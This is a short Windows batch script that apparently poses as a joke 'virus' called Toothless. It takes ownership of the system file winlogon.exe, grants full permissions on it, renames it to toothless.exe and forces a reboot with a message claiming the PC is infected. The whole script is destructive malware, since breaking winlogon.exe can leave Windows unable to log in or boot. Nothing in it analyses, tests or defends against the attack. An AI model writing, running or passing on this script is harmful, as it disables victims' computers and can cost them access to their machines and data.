@ECHO OFF
cd "C:\Windows\System32"
takeown /F winlogon.exe
icacls winlogon.exe /grant administrators:F /T 
rename winlogon.exe toothless.exe
shutdown /r /t 10 /c "Toothless has successfully infected the PC! Shutting down..."